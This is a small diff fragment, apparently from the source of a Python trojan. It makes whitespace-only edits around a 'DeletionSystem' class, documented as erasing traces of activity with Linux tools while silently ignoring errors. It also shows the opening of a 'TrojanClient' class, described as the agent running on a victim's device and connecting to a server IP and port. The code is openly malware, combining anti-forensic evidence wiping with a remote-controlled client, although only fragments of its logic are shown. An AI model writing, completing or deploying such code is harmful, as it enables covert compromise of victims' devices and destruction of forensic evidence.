@@ -122,7 +122,7 @@ class DeletionSystem:
                 self.deleted_files.append(path)
             except Exception:
                 pass
- class DeletionSystem:
+class DeletionSystem:
     """Erases traces of activity using Linux tools."""
     def __init__(self):
         self.deleted_files = []
@@ -153,8 +153,6 @@ class DeletionSystem:
                 self.deleted_files.append(path)
             except Exception:
                 pass
-
-
 class TrojanClient:
     """The agent that runs on the victim's device."""
     def __init__(self, server_ip: str, server_port: int):
